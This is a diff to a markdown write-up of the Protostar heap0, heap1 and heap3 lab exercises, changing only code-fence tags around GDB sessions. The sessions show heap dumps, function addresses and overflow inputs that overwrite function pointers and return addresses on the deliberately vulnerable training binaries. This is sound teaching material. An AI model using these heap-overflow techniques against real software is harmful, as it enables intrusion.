@@ -82,7 +82,7 @@ structure.
 Let's take a look at the layout of the heap memory in GDB. We set a breakpoint
 right before the `main()` function returns.
 
-```
+```shell
 (gdb) break *0x08048500
 Breakpoint 1 at 0x8048500: file heap0/heap0.c, line 40.
 (gdb) run AAAA
@@ -97,7 +97,7 @@ Breakpoint 1, 0x08048500 in main (argc=134513804, argv=0x2) at heap0/heap0.c:40
 
 Looking at `info proc map`, we see that the heap starts from `0x804a000`.
 
-```
+```shell
 (gdb) info proc map
 process 1984
 cmdline = '/opt/protostar/bin/heap0'
@@ -116,7 +116,7 @@ Mapped address spaces:
 Looking at the heap memory, we can see where our "AAAA" input is stored on the
 heap.
 
-```
+```shell
 (gdb) x/50x 0x804a000
 0x804a000:      0x00000000      0x00000049      0x41414141      0x00000000
 0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
@@ -136,7 +136,7 @@ heap.
 We also see that the address of the `nowinner()` function is stored on the
 heap due to `f->fp = nowinner`.
 
-```
+```shell
 (gdb) print &nowinner
 $1 = (void (*)(void)) 0x8048478 <nowinner>
 ```
@@ -145,7 +145,7 @@ We can overwrite that address with the address of `winner()` which will then
 be executed by `f->fp()`. Looking at the heap layout, we can see that we need
 to write 72 bytes followed by `winner()`'s memory address.
 
-```
+```shell
 (gdb) run `python -c "print 'A'*72 + 'BBBB'"`
 Starting program: /opt/protostar/bin/heap0 `python -c "print 'A'*72 + 'BBBB'"`
 data is at 0x804a008, fp is at 0x804a050
@@ -156,7 +156,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 We find the memory address of `winner()`.
 
-```
+```shell
 (gdb) print &winner
 $1 = (void (*)(void)) 0x8048464 <winner>
 ```
@@ -216,7 +216,7 @@ another part of the memory on the heap that contains the char buffer.
 Remember how heap memory is allocated contiguously? Due to the order of the
 `malloc` calls, this is roughly how the heap will look like.
 
-```
+```shell
 [i1 structure][i1's name buffer][i2 structure][i2's name buffer]
 ```
 
@@ -227,7 +227,7 @@ we want.
 
 Let's confirm this.
 
-```
+```shell
 (gdb) info proc map
 process 2034
 cmdline = '/opt/protostar/bin/heap1'
@@ -243,7 +243,7 @@ Mapped address spaces:
 ... <snip> ...
 ```
 
-```
+```shell
 (gdb) x/50x  0x804a000
 0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
 0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
@@ -265,7 +265,7 @@ followed by the memory address where we want the second `strcpy` call to write
 to. We confirm this by attempting to write to `0x42424242` which should result
 in a segmentation fault.
 
-```
+```shell
 (gdb) run `python -c "print 'A' * 20 + 'BBBB'"` CCCC
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -281,7 +281,7 @@ Now that we can write to an arbitrary address, what and where should we write?
 The natural thought here is to overwrite the the return address of `main()` on
 the stack with the memory address of `winner()`.
 
-```
+```shell
 (gdb) print &winner
 $1 = (void (*)(void)) 0x8048494 <winner>
 ```
@@ -290,7 +290,7 @@ Now, how we do know where the return address is stored on the stack? By setting
 a breakpoint on the `ret` instruction in `main()`, we can see that the address
 when running in GDB is `0xbffff77c`.
 
-```
+```shell
 (gdb) break *0x08048567
 Breakpoint 1 at 0x8048567: file heap1/heap1.c, line 35.
 (gdb) run AAAA BBBB
@@ -327,7 +327,7 @@ terminating `NULL` byte.
 What we can do is write another 4 bytes with the memory address of `exit()`,
 which should make the program exit cleanly.
 
-```
+```shell
 (gdb) print &exit
 $1 = (<text variable, no debug info> *) 0xb7ec60c0 <*__GI_exit>
 ```
@@ -501,7 +501,7 @@ that this technique will no longer work in present-day glibc as the malloc
 implementation has been hardened over the years.
 
 This is the layout of the heap before any of the pointers are freed.
-```
+```shell
 (gdb) x/50x 0x804c000
 0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
 0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
@@ -620,7 +620,7 @@ write-what-where condition).
 Resuming execution of the program, we see that the heap layout is as follows
 after the three `free()` calls.
 
-```
+```shell
 (gdb) x/50x 0x804c000
 0x804c000:      0x00000000      0x00000029      0x0804c028      0x00000000
 0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
@@ -719,7 +719,7 @@ to subtract 12 bytes from the memory address that we want to write to.
 Next, we get the memory address of the `winner()` function which is
 `0x8048864`.
 
-```
+```shell
 (gdb) print &winner
 $1 = (void (*)(void)) 0x8048864 <winner>
 ```
